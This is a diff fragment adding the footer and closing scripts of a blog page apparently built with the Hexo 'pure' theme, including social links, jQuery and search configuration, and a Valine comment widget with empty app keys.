+
+</main>
+
+  <footer class="footer" itemscope itemtype="http://schema.org/WPFooter">
+	
+	
+    <ul class="social-links">
+    	
+        <li><a href="https://github.com/monster414" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
+        
+        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="icon icon-rss"></i></a></li>
+        
+    </ul>
+
+    <div class="copyright">
+    	
+        <div class="publishby">
+        	Theme by <a href="https://github.com/cofess" target="_blank"> cofess </a>base on <a href="https://github.com/cofess/hexo-theme-pure" target="_blank">pure</a>.
+        </div>
+    </div>
+</footer>
+  <script src="//cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js"></script>
+<script>
+window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
+</script>
+
+<script src="/js/plugin.min.js"></script>
+
+
+<script src="/js/application.js"></script>
+
+
+    <script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: 'Posts',
+            PAGES: 'Pages',
+            CATEGORIES: 'Categories',
+            TAGS: 'Tags',
+            UNTITLED: '(Untitled)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+
+<script src="/js/insight.js"></script>
+
+
+
+
+
+
+   
+
+
+
+
+   
+    
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/valine"></script>
+  <script type="text/javascript">
+  var GUEST = ['nick', 'mail', 'link'];
+  var meta = 'nick,mail,link';
+  meta = meta.split(',').filter(function(item) {
+    return GUEST.indexOf(item) > -1;
+  });
+  new Valine({
+    el: '#vcomments',
+    verify: false,
+    notify: false,
+    appId: '',
+    appKey: '',
+    placeholder: 'Just go go',
+    avatar: 'mm',
+    meta: meta,
+    pageSize: '10' || 10,
+    visitor: false
+  });
+  </script>
+
+     
+
+
+
+
+
+
+
+</body>
+</html>
